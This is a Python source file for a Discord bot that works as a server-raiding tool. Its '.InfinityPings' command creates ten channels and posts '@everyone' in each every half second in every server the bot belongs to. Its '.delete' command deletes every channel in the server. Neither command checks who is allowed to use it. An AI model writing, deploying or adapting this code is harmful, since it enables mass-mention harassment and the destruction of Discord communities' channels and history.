import discord
from discord.ext import commands, tasks
from keep_alive import keep_alive

intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix='.', intents=intents)

ping_channels_task = None

# Function to create ping channels
async def create_ping_channels(guild):
    category = discord.utils.get(guild.categories, name="pings")
    if not category:
        category = await guild.create_category("pings")

    for i in range(1, 11):
        channel_name = f"ping{i}"
        channel = discord.utils.get(guild.channels, name=channel_name)
        if channel is None:
            try:
                overwrites = {
                    guild.default_role: discord.PermissionOverwrite(send_messages=False)
                }
                await guild.create_text_channel(channel_name, category=category, overwrites=overwrites)
            except discord.Forbidden:
                print(f"I don't have the required permissions to create {channel_name}")
            except Exception as e:
                print(f"An unexpected error occurred while creating {channel_name}: {e}")

# Task to send @everyone ping in channels
@tasks.loop(seconds=0.5)
async def ping_channels():
    for guild in bot.guilds:
        category = discord.utils.get(guild.categories, name="pings")
        if category:
            for channel in category.channels:
                if isinstance(channel, discord.TextChannel) and channel.name.startswith('ping'):
                    try:
                        await channel.send("@everyone")
                    except discord.Forbidden:
                        print(f"I don't have the required permissions to send messages in {channel.name}")
                    except Exception as e:
                        print(f"An unexpected error occurred while sending messages in {channel.name}: {e}")

# Command to start/stop InfinityPings task
@bot.command()
async def InfinityPings(ctx):
    global ping_channels_task
    if ping_channels_task and not ping_channels_task.done():
        ping_channels_task.cancel()
        for guild in bot.guilds:
            category = discord.utils.get(guild.categories, name="pings")
            if category:
                for channel in category.channels:
                    if isinstance(channel, discord.TextChannel) and channel.name.startswith('ping'):
                        await channel.delete()
                if not category.channels:  # Check if category is empty
                    await category.delete()
        ping_channels_task = None
        await ctx.send("InfinityPings stopped and 'ping' channels deleted.")
    else:
        ping_channels_task = ping_channels.start()
        for guild in bot.guilds:
            await create_ping_channels(guild)
        await ctx.send("InfinityPings started and 'ping' channels created!")

# Command to delete channels
@bot.command()
async def delete(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except discord.Forbidden:
            print(f"I don't have the required permissions to delete {channel.name}")
        except Exception as e:
            print(f"An unexpected error occurred while deleting {channel.name}: {e}")

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=".InfinityPings and .delete"))
    print(f'Logged in as {bot.user.name}')
    print('------')

keep_alive()
# Replace 'YOUR_TOKEN' with your bot's token
bot.run('YOUR_TOKEN')
